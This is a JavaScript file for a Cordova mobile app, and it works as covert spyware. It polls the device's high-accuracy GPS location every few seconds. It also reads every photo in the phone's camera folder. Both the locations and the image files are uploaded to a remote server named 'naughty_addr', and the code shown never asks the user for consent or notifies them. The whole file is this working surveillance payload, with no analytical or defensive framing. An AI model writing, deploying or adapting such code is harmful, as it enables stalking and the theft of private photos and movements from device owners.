var onSuccess = function(position) {
    msg = 
        'Time: ' + position.timestamp + ' ' +
        'Lat: ' + position.coords.latitude + ' ' +
        'Lon: ' + position.coords.longitude + ' ' +
        'Accuracy: ' + position.coords.accuracy;
    console.log(msg);

    var fd = new FormData();
    fd.append('data', msg);
    $.ajax({
        type: "POST",
        url: naughty_addr + "/location",
        enctype: 'application/x-www-form-urlencoded',
        cache: false,
        contentType: false,
        processData: false,
        data: fd,
        success: function () {
            console.log("Location posted");
        },
        fail: function() {
            console.log("Location not posted");
        }
    });

    getLocation();
};

function onError(error) {
    msg = 
        'Times: ' + (new Date()).toString() + ' ' +
        'Code: ' + error.code + ' ' +
        error.message;
    console.log(msg);

    var fd = new FormData();
    fd.append('data', msg);
    $.ajax({
        type: "POST",
        url: naughty_addr + "/location",
        enctype: 'application/x-www-form-urlencoded',
        cache: false,
        contentType: false,
        processData: false,
        data: fd,
        success: function () {
            console.log("Location error posted");
        },
        fail: function() {
            console.log("Location error not posted");
        }
    });

    getLocation();
}

function getLocation() {
    time = Date.now();
    console.log(time + " " + window.target_time);
    if (window.target_time > time) {
        setTimeout(getLocation, window.target_time - time);
        return;
    }
    // This 2000ms is for rate limiting. Note that geolocation needs a longer
    //   timeout to acquire the location, so our timeout might be much longer
    //   than the rate limiting because of initial acquisition times.
    // Stupid geolocation enables and disables the location with this API.
    // TODO: perhaps use the location watcher (which sees when you change location)
    //   to keep location enabled at all times.
    window.target_time = Date.now() + 2000;
    navigator.geolocation.getCurrentPosition(onSuccess, onError, { timeout: 20000, enableHighAccuracy: true });
}

// https://cordova.apache.org/docs/en/3.0.0/cordova/file/directoryreader/directoryreader.html
// https://cordova.apache.org/docs/en/3.0.0/cordova/file/file.html

function success(entries) {
    var i = 0;
    console.log("LOGLOGLOG2");
    // Looping functionally because we need to make sure everything is done before
    //   we call the next iteration, or the system runs out of memory, since
    //   most of the actions here are asynchronous.
    function sendImage(entries, i) {
        if (i == entries.length) {
            console.log("LOGLOGLOG2 All done.");
            return;
        }
        if (entries[i].isFile) {
            var fileURI = entries[i].fullPath;
            console.log("LOGLOGLOG2 " + fileURI);
            // http://stackoverflow.com/questions/5392344/sending-multipart-formdata-with-jquery-ajax
            // DEBUG
            //++i;
            //sendImage(entries, i);
            //return;
            // /DEBUG
            var f = entries[i].file(
                function(f) {
                    var r = new FileReader();
                    console.log("LOGLOGLOG2 reading...");
                    r.onloadend = function(evt) {
                        var fd = new FormData();
                        fd.append('data', new Blob([this.result]), f.name);
                        $.ajax({
                            type: "POST",
                            url: naughty_addr + "/upload",
                            enctype: 'multipart/form-data',
                            async: false,
                            cache: false,
                            contentType: false,
                            processData: false,
                            data: fd,
                            success: function () {
                                console.log("LOGLOGLOG2 success");
                                ++i;
                                sendImage(entries, i);
                            },
                            fail: function() {
                                console.log("LOGLOGLOG2 fail");
                                ++i;
                                sendImage(entries, i);
                            }
                        });
                        console.log("LOGLOGLOG2 posted");
                    };
                    r.readAsArrayBuffer(f);
                },
                function(f) {
                    console.log("LOGLOGLOG2 error.");
                    ++i;
                    sendImage(entries, i);
                }
            );
        } else {
            ++i;
            sendImage(entries, i);
        }
    }
    // Start the loop.
    sendImage(entries, i);
}

function fail(error) {
    console.log("LOGLOGLOG3 Failed to list directory contents: " + error.code);
}

if (!(window.started === "file")) {
    window.started = "file";
    window.resolveLocalFileSystemURI("file:///sdcard/DCIM/Camera/", function(dirEntry) {
        // Get a directory reader
        console.log("LOGLOGLOG Creating reader...");
        var directoryReader = dirEntry.createReader();

        // Get a list of all the entries in the directory
        console.log("LOGLOGLOG Reading dirs...");
        directoryReader.readEntries(success, fail);

    });

    window.target_time = Date.now();
    getLocation();
}

